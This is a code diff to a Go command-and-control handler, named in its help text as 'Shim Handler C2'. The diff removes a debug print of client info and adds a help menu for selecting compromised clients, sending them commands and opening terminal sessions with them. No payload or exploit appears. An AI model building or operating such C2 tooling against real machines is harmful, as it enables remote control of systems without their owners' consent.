@@ -69,7 +69,6 @@ func GetConnection(port string) {
 		var clientInfo ClientInfo
 		remoteInfo, err := bufio.NewReader(conn).ReadString('\n')
 		if strings.Index(remoteInfo, "INFO:") != -1 {
-			fmt.Println(remoteInfo)
 			clientInfo = parseParams(remoteInfo)
 		}
 		if err != nil {
@@ -229,10 +228,6 @@ func do(client Client) {
 
 }
 
-func displayHelp(cmd string) {
-
-}
-
 func getRandomPort() string {
 	port1 := strconv.Itoa(random(10))
 	port2 := strconv.Itoa(random(99))
@@ -246,4 +241,29 @@ func getRandomPort() string {
 		return remotePort
 	}
 	return getRandomPort()
+}
+
+func displayHelp(cmd string) {
+	switch cmd {
+	case "set":
+		fmt.Printf(
+			"set: Set the current active client\n" +
+				"Usage: set active [client id]\n" +
+				"\n",
+		)
+	default:
+		fmt.Printf(
+			"-----Shim Handler C2: Made by Michael Burke-----\n" +
+				"Commands: \n" +
+				"set  [options]		Set attributes. run \"set help\" for more info.\n" +
+				"get  [options]		Get attributes. run \"get help\" for more info.\n" +
+				"send [command]		Send a command to the active client\n" +
+				"enter			Enter a terminal session with the active client\n" +
+				"leave			Leave the active terminal session\n" +
+				"exit			Exit the application\n" +
+				"help			Display the help menu\n" +
+				"\n",
+		)
+	}
+
 }
